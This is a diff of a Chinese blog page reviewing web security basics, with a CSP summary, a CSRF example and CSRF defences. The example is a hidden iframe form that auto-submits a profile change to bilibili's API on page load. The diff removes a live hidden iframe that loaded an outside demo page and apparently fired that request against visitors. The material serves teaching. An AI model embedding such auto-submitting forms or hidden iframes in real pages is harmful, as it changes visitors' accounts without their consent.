@@ -13,7 +13,7 @@
 <meta property="og:url" content="http://hijimo.github.io/2019/01/25/复习--web安全基础/index.html">
 <meta property="og:site_name" content="hijimo">
 <meta property="og:description" content="CSP内容安全策略（Content Security Policy），用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。CSP通过指定有效域（或者说白名单）使开发者有能力减少或消除XSS攻击所依懒的载体（XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方）。另">
-<meta property="og:updated_time" content="2019-01-26T04:39:22.990Z">
+<meta property="og:updated_time" content="2019-01-26T04:41:53.967Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="hijimo">
 <meta name="twitter:description" content="CSP内容安全策略（Content Security Policy），用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。CSP通过指定有效域（或者说白名单）使开发者有能力减少或消除XSS攻击所依懒的载体（XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方）。另">
@@ -126,8 +126,6 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"autopost"</span> <span class="attr">display</span>=<span class="string">"none"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span>　<span class="attr">action</span>=<span class="string">"https://api.bilibili.com/x/member/web/update"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"uname"</span> <span class="attr">value</span>=<span class="string">"你们"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"usersign"</span> <span class="attr">value</span>=<span class="string">"偷偷的来"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"保密"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"birthday"</span> <span class="attr">value</span>=<span class="string">"1900-1-1"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrf"</span> <span class="attr">value</span>=<span class="string">"024e772a01f7931072dd671808e2ff52"</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	function postUpdate() &#123;</span></span><br><span class="line"><span class="undefined">		document.frames["autopost"].document.Submit("transfer");</span></span><br><span class="line"><span class="undefined">　&#125;</span></span><br><span class="line"><span class="undefined">　document.body.onload = postUpdate</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 </ol>
-<iframe name="badboy" display="none" id="badIframe" src="https://janusdemo.3mm.me/bilibili_iframe.html"><br><br></iframe>
-
 <h5 id="如何防御CSRF"><a href="#如何防御CSRF" class="headerlink" title="如何防御CSRF"></a>如何防御CSRF</h5><ol>
 <li>上OPT或者验证码，由于csrf攻击者拿不到验证码，发起的请求会被拒绝，但是用户体验极差。</li>
 <li>使用随机令牌，用户登录时向用户推送一个csrf随机码，这个码随着用户登录过期而过期，在每一次请求的时候偷偷带上这个码。每个请求服务器都会验证 个码，验证失败拒绝请求。由于csrf无法读取用户cookie，所以这个方式是目前主流的防csrf攻击的方案</li>
@@ -136,7 +134,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2019/01/25/复习--web安全基础/" data-id="cjrczluaj0032sz3gjdeb16lp" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2019/01/25/复习--web安全基础/" data-id="cjrcznmcb0032ty3gqr30hnp6" class="article-share-link">Teilen</a>
       
       
     </footer>
